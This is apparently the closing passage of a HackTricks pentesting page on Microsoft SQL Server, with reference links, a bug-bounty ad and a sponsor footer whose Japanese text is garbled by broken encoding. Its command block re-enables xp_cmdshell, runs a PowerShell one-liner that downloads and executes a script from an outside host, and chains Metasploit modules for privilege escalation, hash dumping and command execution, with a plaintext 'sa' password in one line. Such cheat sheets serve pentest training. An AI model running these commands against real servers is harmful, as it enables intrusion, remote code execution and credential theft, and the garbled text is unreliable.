* [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/](https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/)
* [https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)

â€‹

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofã¯ã™ã¹ã¦ã®æš—å·ãƒã‚°å ±å¥¨é‡‘ã®å ´ã§ã™ã€‚**

**é…å»¶ãªã—ã§å ±é…¬ã‚’å—ã‘å–ã‚‹**\
HackenProofã®å ±å¥¨é‡‘ã¯ã€é¡§å®¢ãŒå ±é…¬äºˆç®—ã‚’å…¥é‡‘ã—ãŸå¾Œã«é–‹å§‹ã•ã‚Œã¾ã™ã€‚ãƒã‚°ãŒæ¤œè¨¼ã•ã‚ŒãŸå¾Œã«å ±é…¬ã‚’å—ã‘å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**Web3ãƒšãƒ³ãƒˆestingã®çµŒé¨“ã‚’ç©ã‚€**\
ãƒ–ãƒ­ãƒƒã‚¯ãƒã‚§ãƒ¼ãƒ³ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¨ã‚¹ãƒãƒ¼ãƒˆã‚³ãƒ³ãƒˆãƒ©ã‚¯ãƒˆã¯æ–°ã—ã„ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã§ã™ï¼æˆé•·ã™ã‚‹Web3ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’ãƒã‚¹ã‚¿ãƒ¼ã—ã¾ã—ã‚‡ã†ã€‚

**Web3ãƒãƒƒã‚«ãƒ¼ãƒ¬ã‚¸ã‚§ãƒ³ãƒ‰ã«ãªã‚‹**\
å„æ¤œè¨¼æ¸ˆã¿ã®ãƒã‚°ã§è©•åˆ¤ãƒã‚¤ãƒ³ãƒˆã‚’ç²å¾—ã—ã€é€±é–“ãƒªãƒ¼ãƒ€ãƒ¼ãƒœãƒ¼ãƒ‰ã®ãƒˆãƒƒãƒ—ã‚’åˆ¶è¦‡ã—ã¾ã—ã‚‡ã†ã€‚

[**HackenProofã§ã‚µã‚¤ãƒ³ã‚¢ãƒƒãƒ—**](https://hackenproof.com/register) ãƒãƒƒã‚­ãƒ³ã‚°ã‹ã‚‰å ±é…¬ã‚’å¾—ã¾ã—ã‚‡ã†ï¼

{% embed url="https://hackenproof.com/register" %}

## HackTricksè‡ªå‹•ã‚³ãƒãƒ³ãƒ‰
```
Protocol_Name: MSSQL    #Protocol Abbreviation if there is one.
Port_Number:  1433     #Comma separated if there is more than one.
Protocol_Description: Microsoft SQL Server         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MSSQL
Note: |
Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applicationsâ€”which may run either on the same computer or on another computer across a network (including the Internet).

#sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G

###the goal is to get xp_cmdshell working###
1. try and see if it works
xp_cmdshell `whoami`
go

2. try to turn component back on
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell `whoami`
go

3. 'advanced' turn it back on
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go




xp_cmdshell "powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')"


https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server

Entry_2:
Name: Nmap for SQL
Description: Nmap with SQL Scripts
Command: nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}

Entry_3:
Name: MSSQL consolesless mfs enumeration
Description: MSSQL enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit'

```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
